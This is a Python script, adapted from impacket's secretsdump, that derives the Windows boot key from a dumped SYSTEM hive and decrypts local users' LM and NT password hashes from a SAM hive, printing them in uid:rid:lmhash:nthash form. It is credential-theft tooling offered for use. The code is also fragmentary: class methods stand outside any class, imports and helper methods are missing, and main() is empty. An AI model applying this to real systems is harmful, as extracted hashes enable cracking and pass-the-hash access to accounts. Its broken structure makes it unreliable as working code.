# Patrick Sacchet

# Purpose of this script is to utilize output files from our DotNet-Dump executable and calculate user hashes (NTLM) with them

# Credit to impacket for a lot of this decryption; I merely put the pieces together: https://github.com/fortra/impacket


def getBootKey(self):
        # Local Version whenever we are given the files directly
        bootKey = b''
        tmpKey = b''
        winreg = winregistry.Registry(self.__systemHive, False)
        # We gotta find out the Current Control Set
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = "ControlSet%03d" % currentControlSet
        for key in ['JD', 'Skew1', 'GBG', 'Data']:
            LOG.debug('Retrieving class info for %s' % key)
            ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet, key))
            digit = ans[:16].decode('utf-16le')
            tmpKey = tmpKey + b(digit)

        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]

        tmpKey = unhexlify(tmpKey)

        for i in range(len(tmpKey)):
            bootKey += tmpKey[transforms[i]:transforms[i] + 1]

        LOG.info('Target system bootKey: 0x%s' % hexlify(bootKey).decode('utf-8'))

        return bootKey


def __decryptHash(self, rid, cryptedHash, constant, newStyle = False):
        # Section 2.2.11.1.1 Encrypting an NT or LM Hash Value with a Specified Key
        # plus hashedBootKey stuff
        Key1,Key2 = self.__cryptoCommon.deriveKey(rid)

        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)

        if newStyle is False:
            rc4Key = self.MD5( self.__hashedBootKey[:0x10] + pack("<L",rid) + constant )
            rc4 = ARC4.new(rc4Key)
            key = rc4.encrypt(cryptedHash['Hash'])
        else:
            key = self.__cryptoCommon.decryptAES(self.__hashedBootKey[:0x10], cryptedHash['Hash'], cryptedHash['Salt'])[:16]

        decryptedHash = Crypt1.decrypt(key[:8]) + Crypt2.decrypt(key[8:])

        return decryptedHash

def dump(self):
    NTPASSWORD = b"NTPASSWORD\0"
    LMPASSWORD = b"LMPASSWORD\0"

    if self.__samFile is None:
        # No SAM file provided
        return

    LOG.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)')
    self.getHBootKey()

    usersKey = 'SAM\\Domains\\Account\\Users'

    # Enumerate all the RIDs
    rids = self.enumKey(usersKey)
    # Remove the Names item
    try:
        rids.remove('Names')
    except:
        pass

    for rid in rids:
        userAccount = USER_ACCOUNT_V(self.getValue(ntpath.join(usersKey,rid,'V'))[1])
        rid = int(rid,16)

        V = userAccount['Data']

        userName = V[userAccount['NameOffset']:userAccount['NameOffset']+userAccount['NameLength']].decode('utf-16le')

        if userAccount['NTHashLength'] == 0:
            logging.debug('The account %s doesn\'t have hash information.' % userName)
            continue

        encNTHash = b''
        if V[userAccount['NTHashOffset']:][2:3] == b'\x01':
            # Old Style hashes
            newStyle = False
            if userAccount['LMHashLength'] == 20:
                encLMHash = SAM_HASH(V[userAccount['LMHashOffset']:][:userAccount['LMHashLength']])
            if userAccount['NTHashLength'] == 20:
                encNTHash = SAM_HASH(V[userAccount['NTHashOffset']:][:userAccount['NTHashLength']])
        else:
            # New Style hashes
            newStyle = True
            if userAccount['LMHashLength'] == 24:
                encLMHash = SAM_HASH_AES(V[userAccount['LMHashOffset']:][:userAccount['LMHashLength']])
            encNTHash = SAM_HASH_AES(V[userAccount['NTHashOffset']:][:userAccount['NTHashLength']])

        LOG.debug('NewStyle hashes is: %s' % newStyle)
        if userAccount['LMHashLength'] >= 20:
            lmHash = self.__decryptHash(rid, encLMHash, LMPASSWORD, newStyle)
        else:
            lmHash = b''

        if encNTHash != b'':
            ntHash = self.__decryptHash(rid, encNTHash, NTPASSWORD, newStyle)
        else:
            ntHash = b''

        if lmHash == b'':
            lmHash = ntlm.LMOWFv1('','')
        if ntHash == b'':
            ntHash = ntlm.NTOWFv1('','')

        answer =  "%s:%d:%s:%s:::" % (userName, rid, hexlify(lmHash).decode('utf-8'), hexlify(ntHash).decode('utf-8'))
        self.__itemsFound[rid] = answer
        self.__perSecretCallback(answer)




def main():
    return



if __name__ == '__main__':
    main()